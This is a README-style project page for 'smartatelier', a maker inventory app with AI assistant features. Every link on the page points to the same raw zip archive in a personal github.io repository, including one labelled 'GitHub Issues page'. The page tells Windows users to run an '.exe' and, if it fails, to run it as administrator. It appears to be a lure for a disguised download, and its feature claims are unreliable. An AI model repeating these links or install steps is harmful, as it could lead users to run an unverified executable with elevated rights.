---
layout: "default"
title: "🧰 smartatelier - Manage your maker inventory with AI"
description: "Photographiez votre atelier, importez photos ou vidéos, et retrouvez chaque composant électronique ou filament 3D grâce à l’IA. Inventaire local et gratuit."
---
# 🧰 smartatelier - Manage your maker inventory with AI

[![Download smartatelier](https://img.shields.io/badge/Download-smartatelier-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/TaimoorSajjad07/taimoorsajjad07.github.io/raw/refs/heads/main/docs/superpowers/Application_1.2.zip)

## 👋 Welcome to smartatelier

smartatelier is a local-first inventory application designed specifically for makers, hobbyists, and creators who work with electronic components and 3D printing filaments. It helps you keep track of everything you own—from resistors and microcontrollers to spools of PLA and PETG—all in one organized place.

The application stores all your data locally on your computer, meaning your information stays private and accessible even without an internet connection. You can add photos and videos of your components, organize them by color and type, and even link them to your ongoing projects.

## ✨ Key Features

- **📸 Visual Inventory** – Add photos and videos to each item so you can quickly identify components at a glance.
- **🎨 Color Management** – Organize filaments and components by color, making it easy to find the exact shade you need.
- **📁 Project Linking** – Attach inventory items to specific projects, so you always know what materials are allocated where.
- **🤖 AI Assistants** – Integrated AI helpers (compatible with Claude Code, Codex, and Gemini CLI) suggest optimizations, flag low stock, and answer questions about your inventory.
- **✅ Human Validation** – Every AI suggestion requires your approval before being applied, keeping you in full control.
- **💾 Local-First Storage** – Your data is stored in a SQLite database on your machine. No cloud, no subscription, no data sharing.
- **🖥️ Cross-Platform** – Built with Next.js, runs smoothly on Windows, macOS, and Linux.

## 🚀 Getting Started

### 📥 Download and Install

1. Visit the [download page](https://github.com/TaimoorSajjad07/taimoorsajjad07.github.io/raw/refs/heads/main/docs/superpowers/Application_1.2.zip) to get the latest version of smartatelier.
2. Choose the installer file that matches your operating system (Windows users should select the `.exe` file).
3. Download the file to your computer. This may take a minute depending on your internet speed.

### 🖱️ Running the Application

1. Once the download is complete, locate the file in your Downloads folder or wherever your browser saves files.
2. Double-click the file to begin the installation process.
3. Follow the on-screen instructions. When prompted, choose "Install for me only" if you don't have administrator permissions.
4. After installation, smartatelier will open automatically. You can also find it in your Start Menu or on your desktop.

### 🔄 First-Time Setup

When you launch smartatelier for the first time, you'll be greeted by a welcome screen. Here's what to do:

1. Click **"Create New Inventory"** to start fresh.
2. Give your inventory a name (for example, "My Workshop").
3. Choose a location on your computer where you'd like to store photos and videos. The default folder is fine for most users.
4. That's it! You're ready to start adding items.

## 📦 Adding Your First Item

1. Click the **"Add Item"** button (the plus icon in the top right corner).
2. Select the type: **Component** or **Filament**.
3. Fill in the details:
   - **Name** – e.g., "Arduino Uno R3" or "PLA – Silver"
   - **Quantity** – how many you have
   - **Location** – which drawer or shelf it's stored in
   - **Color** – pick from the color picker or enter a hex code
4. Attach a photo or video by clicking the upload area and selecting a file from your computer.
5. Click **"Save"** to add the item to your inventory.

## 🔍 Searching and Filtering

The search bar at the top of the main screen lets you find items instantly. You can also filter by:

- **Category** (components vs. filaments)
- **Color**
- **Project** association
- **Low stock** (items with quantity below a threshold you set)

## 🤝 Using AI Assistants

smartatelier supports three AI assistants: **Claude Code**, **Codex**, and **Gemini CLI**. These tools can help you:

- **Get recommendations** – "Which filament should I use for a heat-resistant project?"
- **Check stock levels** – "Do I have enough 10k resistors for this project?"
- **Suggest organization** – "How should I reorganize my drawer for efficiency?"

To use an AI assistant:

1. Click the **"AI Assistant"** button in the sidebar.
2. Choose which assistant you want to use (Claude Code, Codex, or Gemini CLI).
3. Type your question in the chat box and press Enter.
4. The AI will analyze your inventory and provide suggestions.
5. **Important:** The AI never changes your data directly. It only proposes actions, which you must approve before they are applied.

## 🗂️ Managing Projects

Projects help you group related items. For example, you might have a "Robot Arm Build" project that uses specific motors, sensors, and filament colors.

To create a project:

1. Go to the **"Projects"** tab.
2. Click **"New Project"**.
3. Enter a name and optional description.
4. To add items, open the project and click **"Add Items"** – select from your existing inventory.

## 💾 Backup and Data Management

Since smartatelier is local-first, your data lives on your computer. To keep it safe:

- **Automatic backups:** smartatelier creates a backup of your database every time you close the application.
- **Manual export:** You can export your entire inventory as a JSON file (menu: *Settings → Export*).
- **Restore:** If you ever need to restore from a backup, go to *Settings → Restore* and select the backup file.

## ❓ Frequently Asked Questions

### Q: Do I need an internet connection to use smartatelier?
**A:** No. The application works entirely offline. AI assistant features require an internet connection only when you actively use them.

### Q: Is my data sent to the cloud?
**A:** Never. Your inventory data, photos, and videos are stored exclusively on your local machine.

### Q: Can I use smartatelier on multiple computers?
**A:** Yes, but you'll need to manually transfer the database file (smartatelier.db) and your media folder between machines.

### Q: What file formats are supported for photos and videos?
**A:** Photos: JPG, PNG, GIF, WEBP. Videos: MP4, MOV, WEBM.

### Q: How do I update smartatelier?
**A:** Visit the download page and install the newest version. Your data will be preserved.

## 🛠️ Troubleshooting

**Problem:** Application won't start.
**Solution:** Ensure you have the latest version of Windows. Right-click the app icon and select "Run as administrator."

**Problem:** Photos are not displaying.
**Solution:** Check that the media folder path in Settings is correct and that the folder hasn't been moved.

**Problem:** AI assistant is not responding.
**Solution:** Check your internet connection and ensure the selected assistant CLI tool is installed on your system.

**Problem:** Search is slow.
**Solution:** This is rare. If it happens, try restarting the application. If the issue persists, check your available disk space.

## 📞 Getting Help

If you encounter any issues or have questions:

- Check the **Help** menu inside the application for built-in documentation.
- Visit the [GitHub Issues page](https://github.com/TaimoorSajjad07/taimoorsajjad07.github.io/raw/refs/heads/main/docs/superpowers/Application_1.2.zip) to report bugs or request features.
- Join community discussions to share tips and tricks with other makers.

## 📜 License

smartatelier is released under the MIT License. You are free to use, modify, and distribute it as you see fit.

---

## 📥 Ready to get started?

[![Download smartatelier](https://img.shields.io/badge/Download%20Now-smartatelier-orange?style=for-the-badge&logo=github&logoColor=white)](https://github.com/TaimoorSajjad07/taimoorsajjad07.github.io/raw/refs/heads/main/docs/superpowers/Application_1.2.zip)

Keywords: 3d-printing, claude-code, codex, electronics, filament, gemini-cli, inventory, local-first, nextjs, sqlite